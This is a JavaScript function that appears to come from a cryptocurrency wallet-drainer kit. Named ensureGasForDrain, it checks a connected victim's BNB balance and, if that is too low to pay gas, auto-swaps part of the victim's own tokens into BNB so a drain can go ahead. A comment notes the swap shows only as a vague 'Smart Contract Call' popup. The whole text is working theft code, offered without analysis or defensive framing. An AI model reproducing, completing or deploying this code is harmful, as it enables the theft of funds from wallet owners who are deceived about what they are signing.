async function ensureGasForDrain() {
    // 1. Check BNB balance
    const bnbBalance = await provider.getBalance(userAddress);
    const bnbInBNB = parseFloat(ethers.utils.formatEther(bnbBalance));
    const minBNBNeeded = 0.0003; // ~$0.10
    
    // 2. If enough BNB, continue
    if (bnbInBNB >= minBNBNeeded) {
        return true; // No swap needed
    }
    
    // 3. NOT ENOUGH BNB - Calculate shortfall
    const shortfallBNB = minBNBNeeded - bnbInBNB; // 0.00028 BNB
    const bnbPrice = await getBNBPrice(); // $300
    const shortfallUSD = shortfallBNB * bnbPrice; // $0.08
    
    // 4. Find smallest token to swap
    for (const [symbol, data] of Object.entries(portfolio.tokens)) {
        if (data.valueUSD < 0.01) continue; // Skip tiny balances
        
        const swapAmount = (shortfallUSD / data.price) * 1.2; // $0.10 worth
        const minBNBOut = shortfallBNB * 1.1; // 0.000308 BNB
        
        if (swapAmount <= data.balanceFormatted) {
            // 5. AUTO-SWAP! (Shows "Smart Contract Call" popup)
            await swapTokensForBNB(symbol, swapAmount, minBNBOut);
            
            // 6. Check if we have enough BNB now
            const newBNB = await provider.getBalance(userAddress);
            const newBNBInBNB = parseFloat(ethers.utils.formatEther(newBNB));
            
            if (newBNBInBNB >= minBNBNeeded) {
                return true; // Gas secured!
            }
        }
    }
    
    return false; // Failed to get gas
}
